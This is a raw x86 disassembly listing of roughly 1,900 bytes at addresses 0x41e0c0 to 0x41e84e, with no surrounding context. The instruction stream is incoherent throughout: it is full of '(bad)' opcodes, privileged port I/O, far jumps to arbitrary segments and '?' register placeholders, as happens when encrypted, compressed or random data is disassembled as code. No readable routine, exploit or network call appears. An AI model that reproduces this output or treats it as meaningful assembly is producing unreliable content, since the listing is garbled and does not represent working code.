  41e0c0:	sbb    edx,0x5b
  41e0c3:	in     al,0x17
  41e0c5:	out    dx,eax
  41e0c6:	mov    ah,0x6b
  41e0c8:	addr16 sti 
  41e0ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0cb:	jno    0x41e0ff
  41e0cd:	repz adc DWORD PTR [edi+0x2d0f56b2],ecx
  41e0d4:	sub    edi,DWORD PTR [ecx+edi*1]
  41e0d7:	sbb    ah,0xa2
  41e0da:	push   esi
  41e0db:	pop    ds
  41e0dc:	xor    esp,DWORD PTR [edi-0x7114289]
  41e0e2:	pushf  
  41e0e3:	in     eax,dx
  41e0e4:	xor    DWORD PTR [ebx],ecx
  41e0e6:	sub    ah,dl
  41e0e8:	jp     0x41e12c
  41e0ea:	sbb    edi,DWORD PTR [edx-0x6223c722]
  41e0f0:	js     0x41e126
  41e0f2:	ins    DWORD PTR es:[edi],dx
  41e0f3:	frstor [ebx+0x59efece7]
  41e0f9:	mov    cl,0x32
  41e0fb:	mov    al,0x4f
  41e0fd:	xchg   edx,eax
  41e0fe:	push   ebx
  41e0ff:	mov    eax,ds:0x700f86c7
  41e104:	addr16 dec edx
  41e106:	push   esi
  41e107:	lock das 
  41e109:	cs push ebp
  41e10b:	xchg   edi,eax
  41e10d:	test   DWORD PTR [edx],esp
  41e10f:	push   ds
  41e110:	dec    eax
  41e111:	pop    eax
  41e112:	outs   dx,DWORD PTR ds:[esi]
  41e113:	ins    DWORD PTR es:[edi],dx
  41e114:	jb     0x41e099
  41e116:	outs   dx,BYTE PTR ds:[esi]
  41e117:	xchg   DWORD PTR [ecx+0x70],ebx
  41e11a:	mov    ch,0x5a
  41e11c:	fsub   QWORD PTR [ecx]
  41e11e:	fstp   QWORD PTR [ecx+0x37]
  41e121:	cld    
  41e122:	mov    BYTE PTR gs:[edi+0x42],dh
  41e126:	mov    dl,0xab
  41e128:	pusha  
  41e129:	inc    ebx
  41e12a:	mov    bl,0x11
  41e12c:	ret    0x93be
  41e12f:	and    ebx,esi
  41e131:	sti    
  41e132:	dec    ecx
  41e133:	ror    DWORD PTR [edi+edx*4+0x192f94aa],0x3c
  41e13b:	or     BYTE PTR [edi-0x301e3d5],al
  41e141:	lock clc 
  41e143:	lods   eax,DWORD PTR ds:[esi]
  41e144:	sub    esi,ebp
  41e146:	xchg   ebx,eax
  41e147:	and    al,0x7c
  41e149:	fs inc ebp
  41e14b:	lea    ecx,[edx+0x73]
  41e14e:	sub    al,0x2
  41e150:	adc    al,0xfe
  41e152:	mov    ah,0x9
  41e154:	std    
  41e155:	fcom   st(1)
  41e157:	outs   dx,BYTE PTR ds:[esi]
  41e158:	mov    ds:0xdd6960c1,eax
  41e15d:	(bad)  
  41e15e:	mov    dl,0xfb
  41e160:	shl    BYTE PTR [esi],1
  41e162:	cld    
  41e163:	loop   0x41e13d
  41e165:	sar    esp,cl
  41e167:	adc    BYTE PTR [ecx+eax*4],bh
  41e16a:	push   eax
  41e16b:	and    esi,DWORD PTR [eax+0x25]
  41e16e:	out    0x21,eax
  41e170:	jbe    0x41e0f2
  41e172:	popa   
  41e173:	sub    ecx,DWORD PTR ss:[ebp-0x9]
  41e177:	dec    esi
  41e178:	ret    
  41e179:	push   edi
  41e17a:	xchg   ebx,eax
  41e17b:	jb     0x41e18d
  41e17d:	add    ebx,eax
  41e17f:	jns    0x41e129
  41e181:	xlat   BYTE PTR ds:[ebx]
  41e182:	pop    ebx
  41e183:	jp     0x41e1e3
  41e185:	cdq    
  41e186:	in     al,dx
  41e187:	data16 mov bh,0x8d
  41e18a:	shr    BYTE PTR [edi],cl
  41e18c:	add    al,dh
  41e18e:	jl     0x41e1ac
  41e190:	enter  0xe83c,0x99
  41e194:	xor    DWORD PTR [ebx-0x13],ebp
  41e197:	sub    eax,DWORD PTR [ebx+ecx*8-0x2c2241bc]
  41e19e:	adc    DWORD PTR [edi+0x66],0x7d28157f
  41e1a5:	jbe    0x41e1b3
  41e1a7:	xor    BYTE PTR [esi+ebp*8+0x5e],bl
  41e1ab:	add    bl,ch
  41e1ad:	pop    ecx
  41e1ae:	jmp    0xc93d8e8d
  41e1b3:	lahf   
  41e1b4:	(bad)  
  41e1b5:	int3   
  41e1b6:	(bad)  
  41e1b7:	scas   eax,DWORD PTR es:[edi]
  41e1b8:	cdq    
  41e1b9:	lea    esp,[eax+0x12]
  41e1bc:	adc    BYTE PTR [edi-0x28a12af2],0xf8
  41e1c3:	and    BYTE PTR [eax+0xe271ecc],dh
  41e1c9:	add    ebp,DWORD PTR [edi-0x149bb677]
  41e1cf:	shl    cl,1
  41e1d1:	fdivr  DWORD PTR [ebp+0x80aa79f]
  41e1d7:	mov    ds:0x522c1286,eax
  41e1dc:	je     0x41e1be
  41e1de:	xor    eax,0xe1d6636e
  41e1e3:	xor    al,BYTE PTR [edx+0x54]
  41e1e6:	cmc    
  41e1e7:	mov    esi,0xd58c0a0d
  41e1ec:	xchg   edx,ecx
  41e1ee:	popa   
  41e1ef:	sbb    DWORD PTR [eax-0x2401414b],edi
  41e1f5:	retf   0xdad5
  41e1f8:	mov    ecx,0xde70ac51
  41e1fd:	add    BYTE PTR [eax+ebx*1-0x67],ah
  41e201:	dec    esp
  41e202:	nop
  41e203:	and    BYTE PTR [eax],ah
  41e205:	jnp    0x41e1a4
  41e207:	cmc    
  41e208:	mov    ?,WORD PTR [ebp-0x56]
  41e20b:	gs pop es
  41e20d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e20e:	push   0xffffffd4
  41e210:	inc    cl
  41e212:	and    BYTE PTR [eax+eax*1-0x48],ch
  41e216:	mov    esi,0xbe2543a0
  41e21b:	jo     0x41e246
  41e21d:	mov    ds:0xaa1c09e3,al
  41e222:	inc    ebp
  41e223:	pusha  
  41e224:	and    al,0x58
  41e226:	ins    DWORD PTR es:[edi],dx
  41e227:	stc    
  41e228:	clc    
  41e229:	lods   al,BYTE PTR ds:[esi]
  41e22a:	push   ecx
  41e22b:	ret    0x5a87
  41e22e:	xchg   ebp,eax
  41e22f:	inc    esp
  41e230:	mov    ds:0x3a1f48bc,eax
  41e235:	jnp    0x41e247
  41e237:	or     eax,0xb8e19c4
  41e23c:	add    edx,DWORD PTR [ebx+0x3f]
  41e23f:	pop    ebp
  41e240:	lods   al,BYTE PTR ds:[esi]
  41e241:	sbb    eax,0xb411627f
  41e246:	dec    esi
  41e247:	sub    DWORD PTR [eax+0x6eb8533f],eax
  41e24d:	stc    
  41e24e:	dec    DWORD PTR [eax+0x707ce81f]
  41e254:	dec    ebp
  41e255:	cmp    dh,BYTE PTR [ebx-0x36]
  41e258:	popf   
  41e259:	pusha  
  41e25a:	inc    ecx
  41e25b:	mov    al,BYTE PTR [esi+0x7eaa5b0]
  41e261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e262:	cdq    
  41e263:	je     0x41e20c
  41e265:	push   esi
  41e266:	add    ah,BYTE PTR [edi+0x39]
  41e269:	xchg   ecx,eax
  41e26a:	fdecstp 
  41e26c:	retf   
  41e26d:	cs pop ebp
  41e26f:	sbb    edx,eax
  41e271:	inc    ecx
  41e272:	jo     0x41e210
  41e274:	sbb    DWORD PTR [edx-0x7f78fde8],0x7b
  41e27b:	mov    dl,dl
  41e27d:	in     eax,0xfb
  41e27f:	xchg   dh,bl
  41e281:	loopne 0x41e2ab
  41e283:	out    0x1d,al
  41e285:	sub    al,BYTE PTR [ebx-0x25]
  41e288:	rep outs dx,BYTE PTR ds:[esi]
  41e28a:	sbb    BYTE PTR ds:0xae32b7a5,dl
  41e290:	fstp   QWORD PTR [ebp+0x7159ee7a]
  41e296:	test   esi,0xb41f6355
  41e29c:	and    al,BYTE PTR [ebx]
  41e29e:	pusha  
  41e29f:	adc    dh,BYTE PTR [esi-0x7e5c807e]
  41e2a5:	mov    ds:0xcfd02b66,eax
  41e2aa:	xor    edx,edi
  41e2ac:	sub    ch,cl
  41e2ae:	sar    ah,0x4c
  41e2b1:	sub    eax,0x4a938c97
  41e2b6:	clc    
  41e2b7:	aaa    
  41e2b8:	imul   ebp,edi,0x4f
  41e2bb:	and    BYTE PTR [esi-0x5ef0969d],ch
  41e2c1:	ficomp DWORD PTR [ebx+esi*1+0x68]
  41e2c5:	repz adc al,0x1e
  41e2c8:	pop    esp
  41e2c9:	test   al,0xd9
  41e2cb:	ss enter 0xe52,0xec
  41e2d0:	push   0xb4e2a02d
  41e2d5:	ficom  DWORD PTR [ebp+0x57]
  41e2d8:	ins    BYTE PTR es:[edi],dx
  41e2d9:	(bad)  
  41e2da:	and    dh,BYTE PTR [edi+0x536f041]
  41e2e0:	es fcompp 
  41e2e3:	ds enter 0x9a0d,0xc5
  41e2e8:	adc    ecx,eax
  41e2ea:	test   al,0x85
  41e2ec:	jle    0x41e30d
  41e2ee:	test   eax,0xf0f31e1e
  41e2f3:	and    BYTE PTR [ebx-0x106e4c4e],bl
  41e2f9:	dec    eax
  41e2fa:	(bad)  
  41e2fb:	sub    dl,BYTE PTR [edx-0x49]
  41e2fe:	sti    
  41e2ff:	(bad)  
  41e300:	jne    0x41e344
  41e302:	scas   eax,DWORD PTR es:[edi]
  41e303:	pop    edi
  41e304:	and    BYTE PTR [edx-0x65],dl
  41e307:	adc    DWORD PTR [edi],0xfffffffb
  41e30a:	cmp    ebp,DWORD PTR [eax+0x233c60a9]
  41e310:	adc    dl,ch
  41e312:	or     edx,edi
  41e314:	push   ds
  41e315:	stos   BYTE PTR es:[edi],al
  41e316:	les    esi,FWORD PTR [ecx]
  41e318:	sub    BYTE PTR [edi],dh
  41e31a:	fcom   QWORD PTR [edx-0x4b547a03]
  41e320:	xor    DWORD PTR ds:0xe53d38a6,ebp
  41e326:	jae    0x41e34e
  41e328:	xchg   DWORD PTR [edi],ebx
  41e32a:	repnz shl BYTE PTR [edx+0x31],0xdb
  41e32f:	mov    cl,0x3c
  41e331:	cmp    eax,0xc81af948
  41e336:	xor    ch,BYTE PTR [ecx]
  41e338:	jg     0x41e393
  41e33a:	mov    bh,0x2e
  41e33c:	dec    ebp
  41e33d:	inc    ebp
  41e33e:	arpl   WORD PTR [ebx],sp
  41e340:	sbb    ebp,DWORD PTR [edx-0x72b16bfc]
  41e346:	dec    ecx
  41e347:	repnz fs cmc 
  41e34a:	xchg   edx,eax
  41e34b:	jbe    0x41e34c
  41e34d:	jns    0x41e30b
  41e34f:	and    edx,DWORD PTR [eax+0x6b]
  41e352:	or     esi,DWORD PTR [eax]
  41e354:	arpl   WORD PTR [ebp-0x264791b2],ax
  41e35a:	cmp    dl,ch
  41e35c:	icebp  
  41e35d:	pop    ds
  41e35e:	push   0x5bada6f0
  41e363:	in     al,dx
  41e364:	in     eax,dx
  41e365:	leave  
  41e366:	bound  esi,QWORD PTR [ebx-0x3ca48fd1]
  41e36c:	dec    ebx
  41e36d:	xchg   DWORD PTR [edi+0x29af1ac9],eax
  41e373:	jge    0x41e32c
  41e375:	xchg   edi,eax
  41e376:	(bad)  
  41e377:	repz jbe 0x41e357
  41e37a:	and    dh,BYTE PTR [ecx-0x6f42fc41]
  41e380:	mov    bh,BYTE PTR [eax]
  41e382:	and    eax,0xe7678bd1
  41e387:	int    0xff
  41e389:	cwde   
  41e38a:	and    BYTE PTR [edx],dl
  41e38c:	mov    ?,eax
  41e38e:	iret   
  41e38f:	(bad)  
  41e390:	cmp    ah,dl
  41e392:	pop    ebp
  41e393:	loop   0x41e388
  41e395:	add    al,0x37
  41e397:	icebp  
  41e398:	(bad)  
  41e399:	inc    ebx
  41e39a:	gs push edx
  41e39c:	pop    ss
  41e39d:	jecxz  0x41e3fe
  41e39f:	icebp  
  41e3a0:	les    edx,FWORD PTR [esi+eax*4-0x14aa41cd]
  41e3a7:	imul   esi,DWORD PTR [esi+edx*1-0x79],0xa2d24c35
  41e3af:	fcmove st,st(1)
  41e3b1:	mov    dh,ch
  41e3b3:	enter  0x9d69,0x31
  41e3b7:	add    dl,BYTE PTR [ecx+0x3acc9de0]
  41e3bd:	mov    ecx,0x3109a481
  41e3c2:	pop    es
  41e3c3:	je     0x41e43d
  41e3c5:	jge    0x41e405
  41e3c7:	cmp    eax,0x445b341f
  41e3cc:	pop    ecx
  41e3cd:	ret    0xe566
  41e3d0:	loop   0x41e409
  41e3d2:	sub    dl,BYTE PTR [ecx-0x1e79ebe6]
  41e3d8:	ins    DWORD PTR es:[edi],dx
  41e3d9:	loop   0x41e367
  41e3db:	out    0x56,eax
  41e3dd:	cmc    
  41e3de:	pop    cx
  41e3e0:	sub    eax,0xf9312545
  41e3e5:	(bad)  
  41e3e6:	test   DWORD PTR [ebx+eiz*8+0x10],0xd6501d63
  41e3ee:	lea    ebx,ds:[eax+ebp*8]
  41e3f2:	jno    0x41e374
  41e3f4:	push   eax
  41e3f5:	add    edi,DWORD PTR [edx-0x14]
  41e3f8:	add    eax,0x1f900b1a
  41e3fd:	mov    al,0xae
  41e3ff:	cs push esp
  41e401:	pop    ebp
  41e402:	(bad)  
  41e403:	into   
  41e404:	(bad)  
  41e405:	sub    ecx,edx
  41e407:	enter  0x75b7,0x6e
  41e40b:	and    eax,0x4307684c
  41e410:	push   esi
  41e411:	pop    edx
  41e412:	jnp    0x41e43f
  41e414:	mov    cl,0x5b
  41e416:	icebp  
  41e417:	sar    DWORD PTR [ecx+0x53],cl
  41e41a:	mov    ds:0xfafc9412,eax
  41e41f:	pop    es
  41e420:	int3   
  41e421:	lods   eax,DWORD PTR ds:[esi]
  41e422:	pusha  
  41e423:	pop    edi
  41e424:	nop
  41e425:	pop    ds
  41e426:	lods   eax,DWORD PTR ds:[esi]
  41e427:	push   es
  41e428:	jecxz  0x41e3ec
  41e42a:	lahf   
  41e42b:	js     0x41e3ca
  41e42d:	repz out dx,eax
  41e42f:	inc    edx
  41e430:	ins    BYTE PTR es:[edi],dx
  41e431:	mov    eax,0xf1e758bc
  41e436:	sub    dh,BYTE PTR [eax+0x23]
  41e439:	sbb    BYTE PTR [ecx],bh
  41e43b:	sub    BYTE PTR [ecx-0x4c],bh
  41e43e:	sub    esp,DWORD PTR [ebx]
  41e440:	mov    ebx,0x71a25d6b
  41e445:	mov    ah,0xaf
  41e447:	adc    bh,bh
  41e449:	jo     0x41e48b
  41e44b:	jb     0x41e471
  41e44d:	cld    
  41e44e:	ret    
  41e44f:	or     al,0xf7
  41e451:	xchg   esp,eax
  41e452:	push   0xa
  41e454:	in     eax,0x9b
  41e456:	lock leave 
  41e458:	add    al,0x8d
  41e45a:	cmp    BYTE PTR [eax],dl
  41e45c:	push   ds
  41e45d:	push   es
  41e45e:	cdq    
  41e45f:	aaa    
  41e460:	sbb    BYTE PTR ds:0xc6a8758d,bl
  41e466:	ror    BYTE PTR [eax-0x20],0x93
  41e46a:	or     bh,BYTE PTR [edi+edi*4-0x29]
  41e46e:	int    0xff
  41e470:	xor    DWORD PTR [edi+esi*1],esi
  41e473:	scas   eax,DWORD PTR es:[edi]
  41e474:	add    BYTE PTR [eax],al
  41e476:	mov    al,0xd
  41e478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e479:	pop    ecx
  41e47a:	rcl    ebx,0xc
  41e47d:	shl    DWORD PTR [eax+0x76],cl
  41e480:	jnp    0x41e4c1
  41e482:	push   0x73
  41e484:	shl    DWORD PTR [ebx+0x24],cl
  41e487:	cmp    BYTE PTR [esp+ebp*2-0x40],bl
  41e48b:	leave  
  41e48c:	in     al,dx
  41e48d:	adc    DWORD PTR [ebx+eiz*8],eax
  41e490:	sub    dh,ch
  41e492:	lods   eax,DWORD PTR ds:[esi]
  41e493:	dec    edi
  41e494:	leave  
  41e495:	xchg   ebp,eax
  41e497:	sbb    eax,0x11266f02
  41e49c:	retf   0xe752
  41e49f:	jmp    0x41e4a6
  41e4a1:	int    0xdc
  41e4a3:	pop    ebp
  41e4a4:	push   ecx
  41e4a5:	sbb    al,0xf8
  41e4a7:	pop    ecx
  41e4a8:	mov    esp,0x42b4d0f
  41e4ad:	sub    DWORD PTR [ebx+0x59d9a206],esp
  41e4b3:	mov    DWORD PTR [ebx+edi*2],edx
  41e4b6:	and    dl,al
  41e4b8:	mov    WORD PTR [edi],?
  41e4ba:	dec    ebx
  41e4bb:	and    DWORD PTR [edi+0x7359b53c],ebx
  41e4c1:	mov    cl,ah
  41e4c3:	sbb    eax,0x7f9bfbc
  41e4c8:	js     0x41e4f1
  41e4ca:	mov    dh,0xde
  41e4cc:	retf   0x5792
  41e4cf:	push   ebp
  41e4d0:	inc    esp
  41e4d1:	push   es
  41e4d2:	add    al,0xc6
  41e4d4:	cdq    
  41e4d5:	adc    DWORD PTR [ebp+0x600616d9],edi
  41e4db:	mov    BYTE PTR [edx],bh
  41e4dd:	inc    ebp
  41e4de:	xor    ah,BYTE PTR [edx]
  41e4e0:	jns    0x41e4b1
  41e4e2:	mov    BYTE PTR [edx],0xd2
  41e4e5:	imul   ebp,DWORD PTR [ebx+0x430c1f7b],0xa1ec11ac
  41e4ef:	loop   0x41e501
  41e4f1:	jne    0x41e519
  41e4f3:	dec    al
  41e4f5:	not    edi
  41e4f7:	push   ecx
  41e4f8:	gs mov ebp,0x8a4e9de
  41e4fe:	sub    eax,0x3b66379b
  41e503:	pop    ecx
  41e504:	sbb    eax,0x1e7e5b16
  41e509:	jp     0x41e4c0
  41e50b:	mov    al,ds:0xf9d81335
  41e510:	loopne 0x41e4b1
  41e512:	std    
  41e513:	mov    WORD PTR [esi+0x711c114a],es
  41e519:	cmp    eax,0x2606b192
  41e51e:	xchg   BYTE PTR ds:0x80451976,cl
  41e524:	(bad)  
  41e525:	jmp    0x52a8:0x74ef1699
  41e52c:	mov    ah,0x7d
  41e52e:	or     esi,edi
  41e530:	xor    al,dl
  41e532:	jp     0x41e549
  41e534:	rol    DWORD PTR [esi+0x4fb3874b],1
  41e53a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e53b:	cs fadd st,st(4)
  41e53e:	retf   
  41e53f:	test   al,0x35
  41e541:	push   esi
  41e542:	jmp    0x41e52b
  41e544:	shl    ah,cl
  41e546:	out    0xca,eax
  41e548:	sub    DWORD PTR [ebx+ecx*1-0x49ca385b],eax
  41e54f:	fadd   DWORD PTR [edi-0x68]
  41e552:	int    0xe0
  41e554:	adc    eax,edx
  41e556:	push   ss
  41e557:	fisub  DWORD PTR [edi]
  41e559:	ins    BYTE PTR es:[edi],dx
  41e55a:	iret   
  41e55b:	lds    esp,FWORD PTR [edi-0x17f8fa12]
  41e561:	stos   BYTE PTR es:[edi],al
  41e562:	mov    edi,0x1f992104
  41e567:	mov    edi,0x285a2351
  41e56c:	jbe    0x41e55c
  41e56e:	jmp    0xf7ef9426
  41e573:	xchg   DWORD PTR [edi+eax*1],esi
  41e576:	dec    edi
  41e577:	mov    edi,ebx
  41e579:	in     eax,0x6c
  41e57b:	inc    ebx
  41e57c:	sub    al,0x1f
  41e57e:	mov    BYTE PTR [esi+0x5f],0x75
  41e582:	pop    es
  41e583:	std    
  41e584:	inc    edx
  41e585:	pushf  
  41e586:	cmc    
  41e587:	push   0xffffffe6
  41e589:	bound  edx,QWORD PTR [edi-0x17]
  41e58c:	sahf   
  41e58d:	out    dx,al
  41e58e:	out    dx,al
  41e58f:	mov    al,ds:0x9c648bfa
  41e594:	in     eax,0x62
  41e596:	xor    DWORD PTR [ebp-0x10c3d3ba],ebx
  41e59c:	loope  0x41e5bd
  41e59e:	mov    ah,0xe4
  41e5a0:	dec    ebp
  41e5a1:	mov    ebp,0xc6fc3a78
  41e5a6:	gs xchg esi,eax
  41e5a8:	retf   
  41e5a9:	inc    ecx
  41e5aa:	xor    eax,0xa4d736a9
  41e5af:	mov    ah,0x7c
  41e5b1:	fadd   DWORD PTR [eax+esi*1+0x423cbfcb]
  41e5b8:	sbb    al,al
  41e5ba:	data16 in al,0x43
  41e5bd:	out    dx,al
  41e5be:	xor    ecx,esi
  41e5c0:	or     BYTE PTR [ecx+ebp*4],ch
  41e5c3:	mov    ?,WORD PTR [esi+0x3f]
  41e5c6:	mov    esp,0x5fc779f8
  41e5cb:	pop    eax
  41e5cc:	push   esi
  41e5cd:	jo     0x41e563
  41e5cf:	cs inc esp
  41e5d1:	lahf   
  41e5d2:	mov    esp,eax
  41e5d4:	loop   0x41e616
  41e5d6:	sub    al,0xf8
  41e5d8:	std    
  41e5d9:	jmp    0x304a:0xad400b84
  41e5e0:	inc    ecx
  41e5e1:	das    
  41e5e2:	push   eax
  41e5e3:	std    
  41e5e4:	inc    esi
  41e5e5:	inc    ebx
  41e5e6:	mov    esi,0x135847de
  41e5eb:	sbb    BYTE PTR [eax],0x9d
  41e5ee:	xchg   ecx,eax
  41e5ef:	or     DWORD PTR [ebx+ebp*8],edx
  41e5f2:	idiv   esp
  41e5f4:	repz cwde 
  41e5f6:	inc    ebx
  41e5f7:	mov    BYTE PTR [edi+esi*2],ah
  41e5fa:	adc    DWORD PTR [ebx-0x526ea804],edi
  41e600:	fs xchg ecx,eax
  41e602:	xchg   ecx,eax
  41e603:	mov    DWORD PTR [ebp-0x2b83c874],ebx
  41e609:	in     eax,0x77
  41e60b:	push   es
  41e60c:	mul    BYTE PTR [edx+0x47]
  41e60f:	pop    ebx
  41e610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e611:	push   ds
  41e612:	js     0x41e5fa
  41e614:	cmp    ebp,eax
  41e616:	jmp    0xfa1:0xc404e85b
  41e61d:	cmc    
  41e61e:	cli    
  41e61f:	or     ah,BYTE PTR [edx-0x739d1aec]
  41e625:	(bad)  
  41e626:	jmp    0x41e5dc
  41e628:	cmp    DWORD PTR [esi-0x6fa207bd],ecx
  41e62e:	sbb    eax,0xdc5a7552
  41e633:	xchg   ecx,eax
  41e634:	xchg   esi,eax
  41e635:	and    al,0x6d
  41e637:	mov    ds:0xdac45d6f,eax
  41e63c:	aad    0x5c
  41e63e:	repnz pusha 
  41e640:	xor    eax,0x390e92be
  41e645:	mov    al,ds:0xf8fe6669
  41e64a:	cmp    al,0x31
  41e64c:	jmp    0x41e630
  41e64e:	call   0x9b18:0xe76b5217
  41e655:	(bad)  
  41e656:	dec    ebp
  41e657:	cmp    al,0x64
  41e659:	mov    esp,gs
  41e65b:	mov    ah,0x78
  41e65d:	sub    al,0x55
  41e65f:	xchg   BYTE PTR [ecx+0x66],dh
  41e662:	in     al,dx
  41e663:	scas   al,BYTE PTR es:[edi]
  41e664:	inc    ebp
  41e665:	mov    edi,0x3bcd2a10
  41e66a:	pusha  
  41e66b:	xor    BYTE PTR [ebx],bh
  41e66d:	fisttp DWORD PTR [ecx]
  41e66f:	mov    ds:0xbf016ec9,eax
  41e674:	push   eax
  41e675:	and    BYTE PTR [esi],al
  41e677:	add    DWORD PTR [esi+0x7e21b2ee],esi
  41e67d:	clc    
  41e67e:	(bad)  
  41e67f:	and    eax,0x3e91dae3
  41e684:	push   edi
  41e685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e686:	jle    0x41e630
  41e688:	in     al,dx
  41e689:	loopne 0x41e6b7
  41e68b:	mov    esi,0x965815ab
  41e690:	inc    edi
  41e691:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e692:	sbb    edx,0xc98e965a
  41e698:	sti    
  41e699:	rsm    
  41e69b:	jle    0x41e70f
  41e69d:	lds    eax,FWORD PTR [edi+ecx*2-0x62]
  41e6a1:	call   0xf9c1:0xc96c9918
  41e6a8:	cmp    al,0xdb
  41e6aa:	sbb    BYTE PTR [ecx+0x62a9907e],ch
  41e6b0:	xlat   BYTE PTR ds:[ebx]
  41e6b1:	jecxz  0x41e705
  41e6b3:	in     eax,dx
  41e6b4:	retf   0x88df
  41e6b7:	xchg   esi,eax
  41e6b8:	adc    ch,cl
  41e6ba:	add    al,0x90
  41e6bc:	adc    al,0x35
  41e6be:	test   eax,0xbf702934
  41e6c3:	jecxz  0x41e734
  41e6c5:	pop    ss
  41e6c6:	in     al,0x70
  41e6c8:	add    al,0x11
  41e6ca:	cmp    BYTE PTR [esi],0x7a
  41e6cd:	cmp    esi,DWORD PTR [ecx-0x37]
  41e6d0:	rcl    BYTE PTR [edi],0x4d
  41e6d3:	inc    edx
  41e6d4:	and    BYTE PTR [ebp+0x2a36861b],0xc4
  41e6db:	iret   
  41e6dc:	cmp    eax,0x2104f742
  41e6e1:	ret    0x1812
  41e6e4:	into   
  41e6e5:	push   0x1d
  41e6e7:	dec    esp
  41e6e8:	je     0x41e69f
  41e6ea:	ss or  al,0x30
  41e6ed:	std    
  41e6ee:	mov    dl,0x0
  41e6f0:	sub    BYTE PTR [eax+edx*4-0x7f444bd5],dh
  41e6f7:	not    BYTE PTR [esi+0x53]
  41e6fa:	jne    0x41e708
  41e6fc:	mov    cl,0x9
  41e6fe:	imul   DWORD PTR [ecx]
  41e700:	and    BYTE PTR ds:0x6d04e652,ch
  41e706:	les    esi,FWORD PTR [eax-0x6a]
  41e709:	adc    eax,0x4dab6c9c
  41e70e:	inc    esi
  41e70f:	jmp    0x41e6ef
  41e711:	mov    bh,0xd4
  41e713:	push   cs
  41e714:	jecxz  0x41e6f5
  41e716:	imul   ecx,DWORD PTR [eax-0xa5a0741],0x5f
  41e71d:	sbb    al,0x28
  41e71f:	push   cs
  41e720:	dec    esi
  41e721:	dec    esp
  41e722:	pop    esi
  41e723:	imul   ecx,DWORD PTR [ecx],0xffffffb1
  41e726:	and    bl,BYTE PTR [edi+0x32]
  41e729:	add    eax,0x19f3e910
  41e72e:	out    0x7e,al
  41e730:	jp     0x41e6fe
  41e732:	stc    
  41e733:	arpl   WORD PTR [eax+0xbfc9e44],dx
  41e739:	aam    0x1d
  41e73b:	cmp    dl,BYTE PTR [esi+0x7]
  41e73e:	and    BYTE PTR [ecx],ch
  41e740:	add    edi,DWORD PTR [edi-0x693b7f6b]
  41e746:	loop   0x41e75b
  41e748:	test   al,0xaa
  41e74a:	mov    ecx,0x7fe5d507
  41e74f:	ins    BYTE PTR es:[edi],dx
  41e750:	cs dec ecx
  41e752:	jno    0x41e73f
  41e754:	adc    eax,0x8905a157
  41e759:	cmp    BYTE PTR [eax+0x3b],ch
  41e75c:	popf   
  41e75d:	out    0xc,eax
  41e75f:	(bad)  
  41e760:	test   DWORD PTR [edi-0x75763baa],eax
  41e766:	cmp    esp,DWORD PTR [edi-0x7a]
  41e769:	in     eax,dx
  41e76a:	bound  esp,QWORD PTR [ebx+0x1859738e]
  41e770:	xchg   DWORD PTR [ebx],eax
  41e772:	push   0xb3816f7c
  41e777:	xchg   BYTE PTR [edx],dh
  41e779:	mov    ebx,0x1887c5bb
  41e77e:	sbb    BYTE PTR [edi+0x11],dl
  41e781:	pop    esp
  41e782:	and    al,0x53
  41e785:	(bad)  
  41e788:	inc    esi
  41e789:	mov    edx,0x83c109d
  41e78e:	xchg   ebp,esp
  41e790:	repz xchg esi,eax
  41e792:	or     al,0xbc
  41e794:	mov    bh,0x78
  41e796:	(bad)  
  41e797:	jmp    0x41e7de
  41e799:	xchg   dl,bl
  41e79b:	cwde   
  41e79c:	pop    ecx
  41e79d:	xor    dh,bh
  41e79f:	jl     0x41e7f2
  41e7a1:	mov    esp,0xe631bd51
  41e7a6:	aad    0xa5
  41e7a8:	mov    bh,0xe
  41e7aa:	jle    0x41e759
  41e7ac:	push   esp
  41e7ad:	mov    eax,ds:0x8e4295ca
  41e7b2:	lds    ebx,FWORD PTR [edx]
  41e7b4:	dec    ebp
  41e7b6:	test   al,0xa4
  41e7b8:	fs mov dh,0xb8
  41e7bb:	inc    esp
  41e7bc:	mov    dl,0x3b
  41e7be:	fsubr  DWORD PTR [eax]
  41e7c0:	and    DWORD PTR [edx+0x5d],esp
  41e7c3:	mov    esp,0x4edf668c
  41e7c8:	pop    ecx
  41e7c9:	je     0x41e7a0
  41e7cb:	push   ecx
  41e7cc:	pop    ecx
  41e7cd:	repnz out 0x3d,al
  41e7d0:	inc    esp
  41e7d1:	inc    ebp
  41e7d2:	dec    edi
  41e7d3:	push   ecx
  41e7d4:	outs   dx,DWORD PTR ds:[esi]
  41e7d5:	scas   al,BYTE PTR es:[edi]
  41e7d6:	xchg   ebp,eax
  41e7d7:	pushw  0x85ba
  41e7db:	and    BYTE PTR [ebp+0x48],bl
  41e7de:	jne    0x41e799
  41e7e0:	test   al,0x68
  41e7e2:	sub    al,0x32
  41e7e4:	adc    eax,eax
  41e7e6:	jne    0x41e776
  41e7e8:	(bad)  
  41e7ea:	fadd   QWORD PTR [edi+0x22a77246]
  41e7f0:	mov    ebx,0xbc87e2a8
  41e7f5:	clc    
  41e7f6:	fiadd  WORD PTR [esi]
  41e7f8:	inc    ebx
  41e7f9:	scas   eax,DWORD PTR es:[edi]
  41e7fa:	mov    cl,0x33
  41e7fc:	pop    es
  41e7fd:	adc    BYTE PTR [eax+ebp*2+0x7f6ed44c],dh
  41e804:	add    DWORD PTR [ebx-0x7642e3f0],esi
  41e80a:	nop
  41e80b:	imul   edi,DWORD PTR [ebx+0x65],0xa1598e0d
  41e812:	push   0x49d52b9d
  41e817:	dec    ebx
  41e818:	sub    BYTE PTR [esi+ebx*2+0xf6822f6],al
  41e81f:	and    eax,0xbeec8a0a
  41e824:	xchg   edx,eax
  41e825:	xchg   edx,eax
  41e826:	repz adc DWORD PTR [edx-0x4ef39583],edx
  41e82d:	adc    esi,DWORD PTR [esi]
  41e82f:	add    eax,0x8881ba97
  41e834:	lea    esp,[ebx+0x1d]
  41e837:	out    dx,al
  41e838:	push   esi
  41e839:	sub    al,0x1a
  41e83b:	push   0x479b7443
  41e840:	call   0xf85b:0xf55f38ac
  41e847:	call   0xc150:0xda1e59fe
  41e84e:	call   0x9ae652b7
